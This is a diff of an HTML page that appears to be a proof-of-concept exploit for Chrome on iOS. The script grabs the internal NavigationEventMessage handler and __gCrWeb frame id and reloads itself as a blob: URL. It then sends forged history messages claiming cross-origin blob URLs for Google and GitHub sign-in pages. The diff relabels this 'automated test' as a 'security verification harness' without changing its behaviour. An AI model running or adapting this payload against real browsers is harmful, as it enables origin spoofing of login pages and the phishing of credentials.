@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Automated Security Harness - History State</title>
+    <title>Advanced Security Verification Harness</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0f172a; color: #f8fafc; }
         .card { max-width: 720px; margin: auto; background: #1e293b; padding: 24px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }
@@ -13,11 +13,11 @@
 </head>
 <body>
 <div class="card">
-    <h2>Automated History State Test Harness</h2>
-    <p>Protection Status: <span class="badge">Enforced by url::IsSameOriginWith()</span></p>
+    <h2>History State Security Verification Harness</h2>
+    <p>Engine Defense: <span class="badge">Enforced via url::IsSameOriginWith()</span></p>
     
-    <h3>Automated Execution Log:</h3>
-    <pre id="log-output">Initializing automated harness sequence...</pre>
+    <h3>Diagnostic Trace Log:</h3>
+    <pre id="log-output">Initializing verification sequence...</pre>
 </div>
 
 <script>
@@ -25,7 +25,7 @@
     function log(msg) {
         const pre = document.getElementById('log-output');
         pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
-        console.log('[AutoHarness] ' + msg);
+        console.log('[SecurityHarness] ' + msg);
     }
 
     log("Current Location.href: " + location.href);
@@ -34,15 +34,15 @@
     // 1. Deteksi Message Handler iOS Chrome
     var mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
-        log("[-] Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched environment).");
+        log("[-] Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched build).");
         return;
     }
-    log("[+] Message handler 'NavigationEventMessage' detected successfully.");
+    log("[+] Message handler 'NavigationEventMessage' detected.");
 
-    window.executeAutomatedTest = function() {
-        log("[*] Executing automated test sequence inside container...");
+    window.runVerification = function() {
+        log("[*] Executing verification test suite...");
 
-        // 2. Resolve frame_id dari page-world __gCrWeb
+        // 2. Ambil frame_id dari page-world __gCrWeb
         var frameId = null;
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
@@ -81,7 +81,7 @@
             }
         } catch (err) {}
 
-        // 3. Target Uji Coba Lintas Domain Otomatis
+        // 3. Vektor Uji Lintas Domain
         var testTargets = [
             'blob:https://accounts.google.com/signin',
             'blob:https://github.com/login',
@@ -106,25 +106,25 @@
                         pageUrl: targetUrl
                     });
                     
-                    log("[+] [Vector " + (index + 1) + "] Payload dispatched. Native C++ guard active.");
+                    log("[+] [Vector " + (index + 1) + "] Payload transmitted. On patched builds, native C++ rejects cross-origin blob URL comparison via url::IsSameOriginWith().");
                 } catch (ex) {
                     log("[-] Exception on vector " + (index + 1) + ": " + ex);
                 }
-            }, index * 300);
+            }, index * 350);
         });
     };
 
-    // Otomatis bungkus dokumen ke dalam Blob URL jika belum berada di dalamnya
+    // Auto-packaging ke dalam kontainer Blob URL jika belum aktif
     if (!location.href.startsWith('blob:')) {
-        log("[*] Automatically packaging document into a dynamic Blob URL container...");
+        log("[*] Packaging document into dynamic Blob URL container...");
         var markup = document.documentElement.outerHTML;
         var blobObj = new Blob([markup], { type: 'text/html' });
         var blobUrl = URL.createObjectURL(blobObj);
-        log("[+] Navigating automatically to Blob container: " + blobUrl);
+        log("[+] Navigating to Blob container: " + blobUrl);
         location.href = blobUrl;
     } else {
         log("[+] Running inside active isolated Blob-URL document context.");
-        setTimeout(window.executeAutomatedTest, 500);
+        setTimeout(window.runVerification, 600);
     }
 })();
 </script>
